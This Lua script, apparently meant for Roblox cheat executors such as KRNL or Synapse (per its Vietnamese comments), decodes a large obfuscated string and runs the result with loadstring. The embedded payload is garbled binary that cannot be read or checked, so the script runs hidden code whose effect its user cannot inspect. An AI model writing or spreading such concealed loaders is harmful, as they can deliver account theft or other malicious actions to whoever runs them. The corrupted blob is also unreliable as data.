local encoded = [[
e

"83
d
6A
?Xg
?Xg:

4



(
3
5

<

l


n




<+

I


(
#x

~




Y




J

+
f



<

?-



裎

|2o
O

&

E
&



<
*#&2
*"O
*#
*#&

*(

|2o

0
ɾ

E




*/


"
 Y








gm
Y





(
#8


~
~

e
.ɾ
2bO;
2c
2c&3
j<,
2c&
3
2h
2c&#)

x
3



<<(n
z







m
?h

?mE|



\ r
?

n





?ea
,g:3




k<)<
8



h
d~Ͷ





ɬ
k8
8
gL











ʹ2
֓<!
V



k;%
dL

k)
`
V
(




^G8


V
8



,


|km

<

Y
r




[k

o]cYfY
k;








g




)

l

)










:
{
͞[
g
a






:o
ƼҎҍ{WXg:9
>}
3?4^
n

4
O
J
"



gb


k
4
O
J

"




?
n
vv7
,`




g
;
E
[
)
qk<
63




S(r~9s





ܳ$q


	


#4











\

"


x>

k
4
O
J

"







4
O

6_v6


6



"


Ͻ




>
k"h
L



v




,

n





~

>




]]

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if (x == '=') then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do
			c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
		end
		return string.char(c)
	end))
end

-- ⚠️ CHẠY SCRIPT
local decoded = decode(encoded)

-- Chỉ chạy được trong Exploit như KRNL, Synapse
local f = loadstring(decoded)
if f then
	f()
end